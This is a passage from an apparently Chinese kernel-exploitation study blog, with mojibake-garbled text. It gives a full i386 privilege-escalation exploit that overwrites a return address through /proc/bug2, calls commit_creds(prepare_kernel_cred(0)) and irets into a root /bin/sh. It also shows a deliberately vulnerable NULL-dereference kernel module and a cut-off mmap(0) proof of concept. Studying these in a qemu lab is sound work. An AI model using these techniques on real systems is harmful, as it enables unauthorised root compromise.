frameï¼Œiretä»ä¸‹é¢çš„ç»“æ„ä¸­æ¢å¤åˆ°ç”¨æˆ·æ¨¡å¼"></a>ç¡¬ä»¶åœ¨æ ˆä¸Šä¿å­˜äº†trap frameï¼Œiretä»ä¸‹é¢çš„ç»“æ„ä¸­æ¢å¤åˆ°ç”¨æˆ·æ¨¡å¼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">void</span>* eip;<span class="comment">// instruction pointer +0</span></span><br><span class="line"><span class="keyword">uint32_t</span> cs;<span class="comment">// code segment    +4</span></span><br><span class="line"><span class="keyword">uint32_t</span> eflags;<span class="comment">// CPU flags       +8</span></span><br><span class="line"><span class="keyword">void</span>* esp;<span class="comment">// stack pointer       +12</span></span><br><span class="line"><span class="keyword">uint32_t</span> ss;<span class="comment">// stack segment   +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><h3 id="æ„é€ fake-trap-frameå’Œç”¨æˆ·æ¨¡å¼shell"><a href="#æ„é€ fake-trap-frameå’Œç”¨æˆ·æ¨¡å¼shell" class="headerlink" title="æ„é€ fake trap frameå’Œç”¨æˆ·æ¨¡å¼shell"></a>æ„é€ fake trap frameå’Œç”¨æˆ·æ¨¡å¼shell</h3><h4 id="æ„é€ fake-trap-frame-struct-trap-frame"><a href="#æ„é€ fake-trap-frame-struct-trap-frame" class="headerlink" title="æ„é€ fake trap frame(struct trap_frame)"></a>æ„é€ fake trap frame(struct trap_frame)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;pushl %cs; popl tf+4;&quot;</span><span class="comment">//å¡«å……tf.csä¸ºå½“å‰çš„cs</span></span><br><span class="line"><span class="string">&quot;pushfl; popl tf+8;&quot;</span><span class="comment">//å¡«å……tf.eflagsä¸ºå½“å‰çš„eflags</span></span><br><span class="line"><span class="string">&quot;pushl %esp; popl tf+12;&quot;</span><span class="comment">//å¡«å……tf.espä¸ºå½“å‰çš„esp</span></span><br><span class="line"><span class="string">&quot;pushl %ss; popl tf+16;&quot;</span>);<span class="comment">//å¡«å……tf.ssä¸ºå½“å‰çš„ss</span></span><br><span class="line">tf.eip = &amp;launch_shell;<span class="comment">//å¡«å……tf.eipä¸ºlaunch_shell</span></span><br><span class="line">tf.esp -= <span class="number">1024</span>;<span class="comment">//unused part of stack</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç”¨æˆ·æ¨¡å¼shell"><a href="#ç”¨æˆ·æ¨¡å¼shell" class="headerlink" title="ç”¨æˆ·æ¨¡å¼shell"></a>ç”¨æˆ·æ¨¡å¼shell</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æœ€ç»ˆçš„expå’Œè°ƒè¯•"><a href="#æœ€ç»ˆçš„expå’Œè°ƒè¯•" class="headerlink" title="æœ€ç»ˆçš„expå’Œè°ƒè¯•"></a>æœ€ç»ˆçš„expå’Œè°ƒè¯•</h3><blockquote><p>æ³¨æ„æ·»åŠ æ–­ç‚¹ç›´æ¥b bug2_write,é€šè¿‡commit_creds(prepare_kernel_cred(0))èµ‹äºˆrootæƒé™<br>å¹¶é€šè¿‡iretä»å†…æ ¸æ€ç›´æ¥è¿”å›ç”¨æˆ·æ€ç„¶åå¯åŠ¨ç”¨æˆ·æ€çš„shell(launch_shell)æ­¤æ—¶å¾—åˆ°çš„å°±æ˜¯root shell</p></blockquote><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pushl %cs;popl tf+4;&quot;</span> <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">&quot;pushfl;popl tf+8;&quot;</span>  <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">&quot;pushl %esp;popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss;popl tf+16;&quot;</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067c30</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067a90</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov $tf,%esp;&quot;</span></span><br><span class="line">       <span class="string">&quot;iret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">24</span>);</span><br><span class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">20</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/bug2&quot;</span>,O_WRONLY);</span><br><span class="line">    <span class="comment">//exploit</span></span><br><span class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="3-è°ƒè¯•exploit"><a href="#3-è°ƒè¯•exploit" class="headerlink" title="3. è°ƒè¯•exploit"></a>3. è°ƒè¯•exploit</h6><p>å…ˆè¦åšä¸€äº›å‡†å¤‡å·¥ä½œï¼š</p><ul><li>ç¡®å®šæ¨¡å—ä»£ç èŠ‚åœ°å€</li></ul><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploig2-08.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploig2-08.png"></a></p><ul><li>gdbè®¾ç½®</li></ul><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-09.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploit2-09.png"></a><br>ç„¶åå°±å¯ä»¥è¿”å›åˆ°ç³»ç»Ÿä¸­ï¼Œè¿è¡Œexploitç¨‹åºäº†ã€‚</p><p>å¯¹retæŒ‡ä»¤ä¸‹æ–­ï¼Œç„¶åcè¿‡å»ï¼Œè¿™æ—¶å€™å•æ­¥çš„è¯ï¼Œåº”è¯¥å°±retåˆ°æˆ‘ä»¬payloadçš„åœ°å€äº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-10.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-10.png"></a><br>æŸ¥çœ‹ä¸€ä¸‹æ ˆé¡¶çš„æƒ…å†µï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-11.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kerenl-exploioit2-11.png"></a></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å•æ­¥ï¼Œç›´è¡Œè¿›å…¥æˆ‘ä»¬çš„payloadã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-12.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-12.png"></a></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å…ˆå»æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(0))</code>äº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-13.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-13.png"></a></p><p><a href="/Users/swing/Desktop/kerel-exploit2-14.png" class="gallery-item"><img src="/Users/swing/Desktop/kerel-exploit2-14.png"></a></p><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨iretçš„æ—¶å€™ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-15.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-15.png"></a></p><p>çº¢è‰²éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬ä¼ªé€ çš„tfç»“æ„å•¦ï¼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-16.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-16.png"></a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-17.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-17.png"></a></p><p>è¿™è¾¹å¯ä»¥çœ‹åˆ°eipæŒ‡å‘æ˜¯æˆ‘ä»¬ç”¨æ¥èµ·shellçš„å‡½æ•°ï¼Œè¿™æ ·çœ‹æ¥æ•´ä¸ªpayloadç»“æ„æ˜¯æ²¡ä»€ä¹ˆé—®é¢˜çš„ã€‚</p><h2 id="æœ€ç»ˆæ•ˆæœ"><a href="#æœ€ç»ˆæ•ˆæœ" class="headerlink" title="æœ€ç»ˆæ•ˆæœ"></a>æœ€ç»ˆæ•ˆæœ</h2><blockquote><p>æŒ‰write-linux-kernel-exploit-1æ–‡ä¸­â€”â€”qemuä¸­æ·»åŠ æ™®é€šç”¨æˆ·å¹¶æµ‹è¯•<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-18.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/kernel-exploit2-18.png"></a></p></blockquote><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote><p>çœŸå®ç¯å¢ƒä¸­ï¼Œcanaryæ˜¯å¯ç”¨çš„ï¼Œä¸€æ—¦canaryè¢«è¦†ç›–ï¼Œå°±ä¼šé€ æˆkernel panics</p></blockquote><h3 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h3><p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf">linux_kernel_exploit</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-kernel expoit  study (3)---NULL dereference</title>
      <link href="write-kernel-exploits-1.html"/>
      <url>write-kernel-exploits-1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="write-linux-kernel-exploit-1"><a href="#write-linux-kernel-exploit-1" class="headerlink" title="write linux kernel exploit 1"></a>write linux kernel exploit 1</h1><h2 id="å‰è¨€-é‡æ–°é…ç½®ä¸€ä¸‹-busybox"><a href="#å‰è¨€-é‡æ–°é…ç½®ä¸€ä¸‹-busybox" class="headerlink" title="å‰è¨€  -é‡æ–°é…ç½®ä¸€ä¸‹ busybox"></a>å‰è¨€  -é‡æ–°é…ç½®ä¸€ä¸‹ busybox</h2><p>ä¹‹å‰çš„busybox åºŸäº†ï¼Œå‘ç°å‡ºç°äº†æ„æ–™ä¹‹å¤–ï¼Œæƒ…ç†ä¹‹ä¸­çš„é—®é¢˜ã€‚è¿˜æ˜¯å¤ªæµ®èºäº†ï¼Œæ²¡ä»”ç»†çœ‹å‚è€ƒé“¾æ¥ã€‚<br>é‡æ–°é…ç½®ä¸€ä¸‹ busybox</p><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br></pre></td></tr></table></figure><h3 id="step-2-åˆ›å»ºå¯¹åº”çš„ç›®å½•"><a href="#step-2-åˆ›å»ºå¯¹åº”çš„ç›®å½•" class="headerlink" title="step 2 åˆ›å»ºå¯¹åº”çš„ç›®å½•"></a>step 2 åˆ›å»ºå¯¹åº”çš„ç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir proc sys dev etc etc&#x2F;init.d</span><br><span class="line">$ cd etc&#x2F;init.d</span><br><span class="line">$ vim rcS</span><br><span class="line">$ cat rcS</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mount -t proc none &#x2F;proc</span><br><span class="line">mount -t sys none &#x2F;sys</span><br><span class="line">&#x2F;bin&#x2F;mount -n -t sysfs none &#x2F;sys</span><br><span class="line">&#x2F;bin&#x2F;mount -t ramfs none &#x2F;dev</span><br><span class="line">&#x2F;sbin&#x2F;mdev -s</span><br><span class="line">$ chmod +x rcS</span><br><span class="line">$ find . | cpio -o --format&#x3D;newc &gt; rootfs.img</span><br><span class="line">$ gzip -c rootfs.img &gt; rootfs.img.gz</span><br><span class="line">$ cp rootfs.img.gz ..&#x2F;..&#x2F;linux-2.6.32.1</span><br></pre></td></tr></table></figure><h3 id="è§£å†³canâ€™t-not-open-dev-tty2"><a href="#è§£å†³canâ€™t-not-open-dev-tty2" class="headerlink" title="è§£å†³canâ€™t not open /dev/tty2"></a>è§£å†³canâ€™t not open /dev/tty2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cd _install</span><br><span class="line">$ ln -sf null tty2</span><br><span class="line">$ ln -sf null tty3</span><br><span class="line">$ ln -sf null tty4</span><br><span class="line"></span><br><span class="line">$ vim etc&#x2F;init.d&#x2F;fstab</span><br><span class="line">proc  &#x2F;proc      proc    defaults     0      0</span><br><span class="line">proc  &#x2F;proc      proc    defaults     0      0</span><br><span class="line">$  chmod 644 fstab</span><br><span class="line"></span><br><span class="line">$ vim etc&#x2F;init.d&#x2F;inittab</span><br><span class="line">::sysinit:&#x2F;etc&#x2F;init.d&#x2F;rcS</span><br><span class="line">::askfirst:&#x2F;bin&#x2F;sh</span><br><span class="line">$ chmod 644 inittab</span><br></pre></td></tr></table></figure><h3 id="qume-å¯ç”¨busybox"><a href="#qume-å¯ç”¨busybox" class="headerlink" title="qume å¯ç”¨busybox"></a>qume å¯ç”¨busybox</h3><p><code>cd /tmp</code><br>åˆ›å»ºä¸€ä¸ªext2æ–‡ä»¶ç³»ç»Ÿé•œåƒç”¨äºæŠŠjoker_test_syscall_libå’Œå¯¹åº”çš„busyboxæ‰“åŒ…ï¼Œå…¶å¤§å°åº”è¯¥èƒ½å®¹çº³æ•´ä¸ªbusybox/_install</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;my.img bs&#x3D;30M count&#x3D;2</span><br><span class="line">$ mkfs.ext2 -N 512 my.img</span><br></pre></td></tr></table></figure><p>æŒ‚åœ¨é•œåƒï¼Œå¹¶æŠŠbusybx/_installä¸‹çš„å†…å®¹æ‹·è´è¿‡å»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount -t ext2 my.img &#x2F;mnt</span><br><span class="line">$ sudo cp -fr _install&#x2F;* &#x2F;mnt</span><br></pre></td></tr></table></figure><p>å¸è½½é•œåƒ<br><code>$ sudo umount /mnt</code></p><p><code> qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append &quot;root=/dev/sda&quot;</code></p><h2 id="NULL-dereference"><a href="#NULL-dereference" class="headerlink" title="NULL dereference"></a>NULL dereference</h2><blockquote><p>å¤è€çš„Linux NULL pointer dereference exploit,æ˜ å°„0åœ°å€åˆ†é…shellcodeè¿è¡Œ</p></blockquote><h3 id="ä¸€ä¸ªç®€å•çš„demo"><a href="#ä¸€ä¸ªç®€å•çš„demo" class="headerlink" title="ä¸€ä¸ªç®€å•çš„demo"></a>ä¸€ä¸ªç®€å•çš„demo</h3><blockquote><p>æ¼æ´å¾ˆæ˜æ˜¾ï¼Œmy_funptræŒ‡é’ˆæ˜¯ç©ºï¼Œåœ¨è°ƒç”¨è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿwrite_procæ—¶å€™å‡ºç°null dereference</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ vim null_dereference.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> (*my_funptr)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bug1_write</span><span class="params">(struct file *file,<span class="keyword">const</span> <span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">my_funptr();</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">null_dereference_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;null_dereference driver init!\n&quot;</span>);</span><br><span class="line">create_proc_entry(<span class="string">&quot;bug1&quot;</span>,<span class="number">0666</span>,<span class="number">0</span>)-&gt;write_proc = bug1_write;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">null_dereference_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(KERN_ALERT <span class="string">&quot;null_dereference driver exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(null_dereference_init);</span><br><span class="line">module_exit(null_dereference_exit);</span><br></pre></td></tr></table></figure><h3 id="ç®€å•çš„æµ‹è¯•"><a href="#ç®€å•çš„æµ‹è¯•" class="headerlink" title="ç®€å•çš„æµ‹è¯•"></a>ç®€å•çš„æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemuå¯åŠ¨å†…æ ¸ï¼ŒåŠ è½½ç›¸å…³çš„busybox</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda /tmp/my.img -append <span class="string">&quot;root=/dev/sda&quot;</span> </span><br><span class="line"></span><br><span class="line">åŠ è½½æ¨¡å—</span><br><span class="line">$ insmod null_dereference.ko</span><br></pre></td></tr></table></figure><p><a href="http://i2.muimg.com/567571/c5e276ea405d452f.jpg" class="gallery-item"><img src="http://i2.muimg.com/567571/c5e276ea405d452f.jpg"></a></p><h2 id="åœ¨qemuä¸­è¿è¡Œå¹¶æµ‹è¯•"><a href="#åœ¨qemuä¸­è¿è¡Œå¹¶æµ‹è¯•" class="headerlink" title="åœ¨qemuä¸­è¿è¡Œå¹¶æµ‹è¯•"></a>åœ¨qemuä¸­è¿è¡Œå¹¶æµ‹è¯•</h2><blockquote><p>åœ¨æœ¬æœºç¼–è¯‘ç›¸åº”çš„koã€pocå’Œexpï¼Œå¹¶æŠŠkoã€pocå’Œexpæ·»åŠ åˆ°busyboxé•œåƒä¸­ï¼Œç„¶ågdbä¸qemuç»“åˆè°ƒè¯•ï¼Œå…¶ä¸­pocå’Œexpéœ€è¦é™æ€ç¼–è¯‘ã€‚<a href="add-a-system-call">æ–¹æ³•è§â€“åœ¨qemuä¸­æµ‹è¯•</a><br><strong>koæ–‡ä»¶çš„Makefile, KERNELDRç›®å½•è®¾ç½®ä¸ºlinuxå†…æ ¸æºç çš„æ ¹ç›®å½•å³å¯</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := null_dereference.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>  </span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions </span><br></pre></td></tr></table></figure><h3 id="pocæµ‹è¯•"><a href="#pocæµ‹è¯•" class="headerlink" title="pocæµ‹è¯•"></a>pocæµ‹è¯•</h3><blockquote><p>poc</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ vim null_dereference_exp.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">&quot;\xe9\xea\xbe\xad\x0b&quot;</span>;<span class="comment">//jmp 0xbadbeef</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mmap(<span class="number">0</span>, <span 